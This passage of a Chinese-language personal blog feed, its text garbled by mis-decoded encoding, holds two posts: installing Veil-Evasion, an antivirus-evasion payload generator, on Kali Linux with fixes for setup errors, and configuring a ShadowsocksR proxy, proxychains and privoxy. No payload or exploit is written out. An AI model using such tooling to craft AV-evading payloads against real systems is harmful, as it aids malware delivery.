    <content type="html"><![CDATA[<h2 id="Veil-Evasionç®€ä»‹"><a href="#Veil-Evasionç®€ä»‹" class="headerlink" title="Veil-Evasionç®€ä»‹"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>ç®€ä»‹</h2><blockquote><p>Veil-Evasionæ˜¯ä¸€ç§å…æ€å·¥å…·ï¼Œç”¨äºç”Ÿæˆç»•è¿‡å¸¸è§AVçš„metasploit payloadã€‚</p><p>Veil-Evasionè¢«åŸç”Ÿè®¾è®¡åœ¨kaliä¸Šï¼Œ,ä½†kali2020å·²ç»éœ€è¦ç‹¬ç«‹å®‰è£…ã€‚å…¶å®å­˜åœ¨pythonç¯å¢ƒçš„ç³»ç»Ÿä¸Šåº”è¯¥éƒ½èƒ½è¿è¡Œã€‚ä½ å¯ä»¥ç”¨å‘½ä»¤è¡Œè½»æ¾è°ƒç”¨Veil-Evasionï¼ŒæŒ‰èœå•é€‰é¡¹ç”Ÿæˆpayloadã€‚åœ¨åˆ›å»ºpayloadçš„æ—¶å€™ï¼ŒVeil-Evasionä¼šè¯¢é—®ä½ æ˜¯å¦æƒ³æŠŠ<strong>payloadæ–‡ä»¶ç”¨Pyinstalleræˆ–è€…Py2Exeè½¬ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚</strong></p></blockquote><p><strong>å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼</strong></p><a id="more"></a><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><h3 id="é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020-3"><a href="#é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020-3" class="headerlink" title="é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020.3"></a>é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020.3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update        //æ›´æ–°æ‰€æœ‰è½¯ä»¶åŒ…çš„åˆ—è¡¨</span><br><span class="line">apt-get upgrade        //æ›´æ–°æ‰€æœ‰è½¯ä»¶</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…"><a href="#æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…"></a>æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚"><a href="#é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚" class="headerlink" title="é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚"></a>é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å®‰è£…veil"><a href="#å®‰è£…veil" class="headerlink" title="å®‰è£…veil"></a>å®‰è£…veil</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure><p><code>ç”±äºéœ€è¦è¿è¡Œwindowsä¸‹çš„ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦å®‰è£…windowsç³»ç»Ÿä¸‹çš„ç¨‹åº</code></p><p><strong><code>é»˜è®¤å®‰è£…å³å¯</code></strong></p><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class><p><strong><code>å…¶ä»–å®‰è£…ç•¥</code></strong></p><h3 id="å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ"><a href="#å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ" class="headerlink" title="å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ"></a><strong>å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ</strong></h3><blockquote><p><strong>é”™è¯¯å¦‚ä¸‹ï¼ŒæŒ‰æç¤ºæ‰§è¡Œå‘½ä»¤å³å¯</strong></p><p>[I] If you have any errors running Veil, run: <strong>â€˜./Veil.py â€“setupâ€™</strong> and select the nuke the wine folder option</p><p>[I] Done!</p><p>[!] ERROR #2-3: Canâ€™t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh â€“force â€“silent</strong></p><p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class><h2 id="æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»"><a href="#æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»" class="headerlink" title="æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»"></a>æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Veil-Evasionç®€ä»‹&quot;&gt;&lt;a href=&quot;#Veil-Evasionç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;Veil-Evasionç®€ä»‹&quot;&gt;&lt;/a&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==&quot;&gt;Veil-Evasion&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;ç®€ä»‹&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Veil-Evasionæ˜¯ä¸€ç§å…æ€å·¥å…·ï¼Œç”¨äºç”Ÿæˆç»•è¿‡å¸¸è§AVçš„metasploit payloadã€‚&lt;/p&gt;
&lt;p&gt;Veil-Evasionè¢«åŸç”Ÿè®¾è®¡åœ¨kaliä¸Šï¼Œ,ä½†kali2020å·²ç»éœ€è¦ç‹¬ç«‹å®‰è£…ã€‚å…¶å®å­˜åœ¨pythonç¯å¢ƒçš„ç³»ç»Ÿä¸Šåº”è¯¥éƒ½èƒ½è¿è¡Œã€‚ä½ å¯ä»¥ç”¨å‘½ä»¤è¡Œè½»æ¾è°ƒç”¨Veil-Evasionï¼ŒæŒ‰èœå•é€‰é¡¹ç”Ÿæˆpayloadã€‚åœ¨åˆ›å»ºpayloadçš„æ—¶å€™ï¼ŒVeil-Evasionä¼šè¯¢é—®ä½ æ˜¯å¦æƒ³æŠŠ&lt;strong&gt;payloadæ–‡ä»¶ç”¨Pyinstalleræˆ–è€…Py2Exeè½¬ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>kaliè®¾ç½®é…¸é…¸ä¹³</title>
    <link href="https://lunamoore.github.io/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <id>https://lunamoore.github.io/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
    <published>2020-08-16T05:13:04.000Z</published>
    <updated>2020-08-18T07:32:05.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>ç”±äºç»å¸¸éœ€è¦åœ¨vmä¸­ä½¿ç”¨kaliï¼Œå¹¶ä¸”è¦å¤§é‡ä¸‹è½½å›½å¤–èµ„æºï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ä¸ªæ»‹æ¶¦çš„ä»£ç†<br>æ˜¯ä¸èƒ½å¿å—çš„ï¼ä½ è¦ä½›ç³»å½“æˆ‘æ²¡è¯´ã€‚ã€‚ã€‚ä¸‹é¢æ¥è§£å†³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜</p></blockquote><a id="more"></a><h2 id="æµè§ˆå™¨ä»£ç†"><a href="#æµè§ˆå™¨ä»£ç†" class="headerlink" title="æµè§ˆå™¨ä»£ç†"></a>æµè§ˆå™¨ä»£ç†</h2><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a><strong>å‡†å¤‡å·¥ä½œ</strong></h3><blockquote><p>æœ‰å¯ç”¨çš„SSRè´¦å·ï¼Œå¯ä»¥é€‰æ‹©ç½‘ä¸Šå…è´¹åˆ†äº«çš„è´¦å·ï¼Œæˆ–è€…è‡ªå·±åœ¨VPSä¸Šæ­å»ºã€‚</p><p>è™šæ‹Ÿæœºç½‘å¡æ¨¡å¼ä¸ºæ¡¥æ¥</p></blockquote><h3 id="ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…"><a href="#ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…" class="headerlink" title="ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…"></a><strong>ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure><h3 id="é…ç½®SSR"><a href="#é…ç½®SSR" class="headerlink" title="é…ç½®SSR"></a><strong>é…ç½®SSR</strong></h3><p>ä¸€èˆ¬æƒ…å†µåªéœ€è¦ä¿®æ”¹ä»¥ä¸‹æœ‰æ³¨é‡Šçš„åœ°æ–¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,   //æœåŠ¡å™¨IPåœ°å€</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //ç«¯å£</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //å¯†ç </span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //åŠ å¯†æ–¹å¼</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //åè®®</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //åè®®å‚æ•°</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //æ··æ·†</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //æ··æ·†å‚æ•°</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a><strong>é…ç½®ä»£ç†</strong></h3><ul><li>ä»¥Firefoxä¸ºä¾‹ï¼ŒChromeä¸Šè®¾ç½®ç±»ä¼¼ã€‚</li><li>åœ¨åº”ç”¨å•†åº—æ‰¾åˆ°æ’ä»¶ <code>Proxy SwitchyOmega</code>ï¼Œæ·»åŠ è‡³Chrome</li><li>ç‚¹å‡» å›¾æ ‡ &gt;&gt; é€‰é¡¹ &gt;&gt; (å·¦è¾¹)æ–°å»ºæƒ…æ™¯æ¨¡å¼ ,é€‰ç¬¬ä¸€é¡¹ <code>ä»£ç†æœåŠ¡å™¨</code></li></ul><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class><h3 id="è®¾ç½®å¼€æœºå¯åŠ¨"><a href="#è®¾ç½®å¼€æœºå¯åŠ¨" class="headerlink" title="è®¾ç½®å¼€æœºå¯åŠ¨"></a><strong>è®¾ç½®å¼€æœºå¯åŠ¨</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ssrçš„å†…å®¹ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // ç¨‹åºåï¼Œå”¯ä¸€ã€‚</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // å¯åŠ¨é¡¹çš„ç®€çŸ­è¯´æ˜ï¼Œéšå¿ƒå†™ã€‚</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // å¯åŠ¨é¡¹çš„å®Œæ•´è¯´æ˜ï¼Œéšå¿ƒå†™ã€‚</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸ºå¼€æœºè‡ªå¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure><p>åˆ é™¤å¼€æœºå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure><p>å¼€æœºæ‰‹åŠ¨å¼€å¯æˆ–å…³é—­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //å¸è½½</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a><strong>æµ‹è¯•</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class><h2 id="ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†"><a href="#ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†" class="headerlink" title="ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†"></a>ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†</h2><h3 id="ä½¿ç”¨proxychains"><a href="#ä½¿ç”¨proxychains" class="headerlink" title="ä½¿ç”¨proxychains"></a>ä½¿ç”¨proxychains</h3><p><code>proxychains</code>ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†ç¥å™¨ï¼Œç§‘å­¦ä¸Šç½‘ï¼Œå†…ç½‘ç©¿é€æ¸—é€å¿…å¤‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ŒæŸå°¾ä¿®æ”¹è‡ªå·±çš„socks5æœ¬åœ°ä»£ç†åœ°å€å¾ˆç«¯å£ã€‚</p><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class><h3 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class><h3 id="ä½¿ç”¨privoxy"><a href="#ä½¿ç”¨privoxy" class="headerlink" title="ä½¿ç”¨privoxy"></a>ä½¿ç”¨privoxy</h3><p>ä½¿ç”¨Privoxyå®ç°ï¼Œæ­¤æ–¹æ³•åªæœ‰ä¸´æ—¶ç”Ÿæ•ˆ</p><p>é¦–å…ˆå®‰è£…privoxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure><p>æœ¬æ¬¡ä½¿ç”¨å…¨å±€æ¨¡å¼ã€‚å…¨å±€æ¨¡å¼ï¼Œå°†æ‰€æœ‰http/httpsè¯·æ±‚èµ°ä»£ç†æœåŠ¡ã€‚</p><p>1.æ·»åŠ æœ¬åœ°ssræœåŠ¡åˆ°é…ç½®æ–‡ä»¶</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure><p>2.Privoxy é»˜è®¤ç›‘å¬ç«¯å£æ˜¯æ˜¯8118ï¼Œæ¯æ¬¡ä½¿ç”¨éƒ½éœ€è¦æ·»åŠ å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure><p>3.å¯åŠ¨æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure><p>no_proxyæ˜¯ä¸ç»è¿‡privoxyä»£ç†çš„åœ°å€<br>åªèƒ½å¡«å†™å…·ä½“çš„ipã€åŸŸååç¼€ï¼Œå¤šä¸ªæ¡ç›®ä¹‹é—´ä½¿ç”¨â€™,â€™é€—å·éš”å¼€<br>æ¯”å¦‚: export no_proxy=â€localhost, 192.168.1.1, ip.cn, chinaz.comâ€<br>è®¿é—® localhostã€192.168.1.1ã€ip.cnã€*.ip.cnã€chinaz.comã€*.chinaz.com å°†ä¸ä½¿ç”¨ä»£ç†</p></blockquote><p>æŸ¥çœ‹å‡ºå£é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class><h3 id="æµ‹è¯•-2"><a href="#æµ‹è¯•-2" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>å‡ºç°ç½‘é¡µæºç åˆ™ä¸ºæˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;ç”±äºç»å¸¸éœ€è¦åœ¨vmä¸­ä½¿ç”¨kaliï¼Œå¹¶ä¸”è¦å¤§é‡ä¸‹è½½å›½å¤–èµ„æºï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ä¸ªæ»‹æ¶¦çš„ä»£ç†&lt;br&gt;æ˜¯ä¸èƒ½å¿å—çš„ï¼ä½ è¦ä½›ç³»å½“æˆ‘æ²¡è¯´ã€‚ã€‚ã€‚ä¸‹é¢æ¥è§£å†³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
  </entry>
  
</feed>
